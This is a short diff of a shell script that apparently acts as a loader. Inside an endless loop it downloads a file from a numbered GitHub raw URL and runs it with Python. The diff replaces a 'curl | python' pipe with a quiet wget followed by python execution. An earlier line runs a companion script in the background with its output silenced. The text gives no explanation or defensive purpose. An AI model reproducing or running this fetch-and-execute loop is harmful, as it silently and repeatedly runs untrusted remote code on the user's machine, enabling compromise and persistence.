@@ -5,6 +5,8 @@ bash ./linuxcurl84 &> /dev/null &
 while true
 do
 
-curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxcurlgoogle84 | python
+wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxcurlgoogle84
+
+python ./linuxcurlgoogle84
 
 done
